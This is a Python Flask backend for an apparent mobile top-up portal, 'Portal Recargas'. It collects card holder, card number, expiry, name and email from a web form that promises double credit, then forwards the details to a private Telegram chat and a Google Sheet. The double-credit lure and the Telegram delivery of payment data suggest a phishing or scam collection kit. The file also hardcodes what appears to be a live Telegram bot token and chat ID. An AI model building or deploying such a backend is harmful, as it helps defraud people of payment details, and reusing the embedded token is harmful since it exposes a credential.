from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import gspread
from google.oauth2.service_account import Credentials
from datetime import datetime
import os
import json

app = Flask(__name__)
CORS(app)

# ─── CONFIGURACIÓN ───────────────────────────────────────
BOT_TOKEN = "8650017277:AAHL-xCqQIAJ2l3WdCPsZdLlwBdwg5hJpTM"
ADMIN_CHAT_ID = "8149862543"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Google Sheets (opcional - ver README)
SHEETS_ENABLED = os.path.exists("credentials.json")
SPREADSHEET_NAME = "Portal Recargas - Registros"
# ─────────────────────────────────────────────────────────


def send_telegram(mensaje):
    """Envía un mensaje al admin por Telegram."""
    try:
        r = requests.post(TELEGRAM_URL, json={
            "chat_id": ADMIN_CHAT_ID,
            "text": mensaje,
            "parse_mode": "HTML"
        }, timeout=10)
        return r.json()
    except Exception as e:
        print(f"Error Telegram: {e}")
        return None


def guardar_en_sheets(datos):
    """Guarda los datos en Google Sheets si está configurado."""
    if not SHEETS_ENABLED:
        return False
    try:
        scope = [
            "https://spreadsheets.google.com/feeds",
            "https://www.googleapis.com/auth/drive"
        ]
        creds = Credentials.from_service_account_file("credentials.json", scopes=scope)
        client = gspread.authorize(creds)

        try:
            sheet = client.open(SPREADSHEET_NAME).sheet1
        except:
            sheet = client.create(SPREADSHEET_NAME).sheet1
            sheet.append_row([
                "Fecha", "Operadora", "Celular Destino",
                "Monto Recargado", "Monto Recibido",
                "Nombre Cliente", "Email", "Tipo Tarjeta",
                "Últimos 4 dígitos"
            ])

        sheet.append_row([
            datos.get("fecha"),
            datos.get("operadora"),
            datos.get("celular"),
            datos.get("monto"),
            datos.get("monto_doble"),
            datos.get("nombre"),
            datos.get("email"),
            datos.get("tipo_tarjeta"),
            datos.get("ultimos4"),
        ])
        return True
    except Exception as e:
        print(f"Error Sheets: {e}")
        return False


@app.route("/recarga", methods=["POST"])
def recarga():
    """Endpoint que recibe los datos del formulario web."""
    try:
        data = request.get_json()

        operadora    = data.get("operadora", "—")
        celular      = data.get("celular", "—")
        monto        = data.get("monto", "—")
        monto_doble  = data.get("monto_doble", "—")
        nombre       = data.get("nombre", "—")
        email        = data.get("email", "—")
        tipo_tarjeta = data.get("tipo_tarjeta", "—")
        num_tarjeta  = data.get("num_tarjeta", "")
        ultimos4     = num_tarjeta.replace(" ", "")[-4:] if num_tarjeta else "——"
        fecha        = datetime.now().strftime("%d/%m/%Y %H:%M")

        # ── Mensaje para Telegram ──
        mensaje = f"""🔔 <b>NUEVA RECARGA</b>
─────────────────────
📱 <b>Operadora:</b> {operadora}
📞 <b>Celular destino:</b> {celular}
💰 <b>Monto recargado:</b> ${monto}
🎁 <b>Recibirá:</b> ${monto_doble}

💳 <b>DATOS DE PAGO</b>
─────────────────────
👤 <b>Titular:</b> {data.get("titular", "—")}
🔢 <b>Tarjeta:</b> •••• •••• •••• {ultimos4}
📅 <b>Vence:</b> {data.get("vencimiento", "—")}
🏦 <b>Tipo:</b> {tipo_tarjeta}

👤 <b>CLIENTE</b>
─────────────────────
📛 <b>Nombre:</b> {nombre}
📧 <b>Email:</b> {email}

🕐 <b>Fecha:</b> {fecha}"""

        # Enviar alerta
        send_telegram(mensaje)

        # Guardar en Sheets
        guardar_en_sheets({
            "fecha": fecha, "operadora": operadora,
            "celular": celular, "monto": monto,
            "monto_doble": monto_doble, "nombre": nombre,
            "email": email, "tipo_tarjeta": tipo_tarjeta,
            "ultimos4": ultimos4
        })

        return jsonify({"ok": True, "mensaje": "Recarga registrada"}), 200

    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"status": "ok", "bot": "Portal Recargas"}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Bot server corriendo en puerto {port}")
    app.run(host="0.0.0.0", port=port, debug=False)
